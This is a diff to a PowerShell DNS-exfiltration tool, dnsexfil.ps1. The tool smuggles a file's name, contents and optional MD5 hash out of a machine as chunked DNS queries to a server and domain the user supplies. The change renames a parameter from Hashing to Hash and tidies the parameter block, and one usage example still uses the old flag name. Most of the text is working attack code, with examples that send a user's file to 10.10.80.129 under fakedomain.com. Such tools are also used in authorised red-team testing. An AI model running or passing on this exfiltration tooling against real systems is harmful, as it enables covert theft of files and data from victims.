@@ -22,43 +22,36 @@ The fakeDNS-server must be listening on your machine
 .PARAMETER Timeout
 (Optional) Set a timeout between queries to slow down or speed up exfiltration. Default value is 2s
 
-.PARAMETER Hashing
+.PARAMETER Hash
 (Optional) Include hash calculation in exfiltration for integrity purposes
 
 .PARAMETER Length
 (Optional) Set the third domain length. Default value is 16
 
 .EXAMPLE
+Use 10.10.80.129 as the fakeDNS-server, and send the file C:\Users\Name\file.txt asking for resolution of [***].fakedomain.com:
 .\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt
 
 .EXAMPLE
+Queries will be like [32-long-chunk].fakedomain.com and going out every 10 seconds:
 .\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hashing
 
 .LINK
 .
-
 #>
 
 Param(
-	[Parameter(
-        Mandatory = $True
-	)][string] $Server,
+	[Parameter(Mandatory = $True)][string] $Server,
 
-	[Parameter(
-        Mandatory = $True
-    )][string] $Domain,
+	[Parameter(Mandatory = $True)][string] $Domain,
 
-	[Parameter(
-		Mandatory = $True
-	)][string] $File,
+	[Parameter(Mandatory = $True)][string] $File,
 
-	[Parameter(
-        Mandatory = $False
-	)][float] $Timeout,
+	[Parameter(Mandatory = $False)][float] $Timeout,
 
-	[Parameter(
-        Mandatory = $False
-	)][int] $Length
+	[Parameter(Mandatory = $False)][int] $Length,
+
+	[Parameter(Mandatory = $False)][switch] $Hash
 )
 
 function Send-ToServer ($Server, $Domain, $Timeout, $Data) {
@@ -125,7 +118,7 @@ $FileName = [System.IO.Path]::GetFileName($File)
 Write-Host "+ Sending filename: $File"
 Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data (Get-DataFromString -String "/fn/$FileName/" -Length $Length)
 
-if ($Hashing) {
+if ($Hash) {
 	Write-Host "+ Sending file hash"
 	$FileHash = (Get-FileHash -Algorithm MD5 $File |Select-Object -ExpandProperty Hash).ToLower()
 	Send-ToServer -Server $Server -Domain $Domain -Timeout $Timeout -Data (Get-DataFromString -String "fh/$FileHash/" -Length $Length)
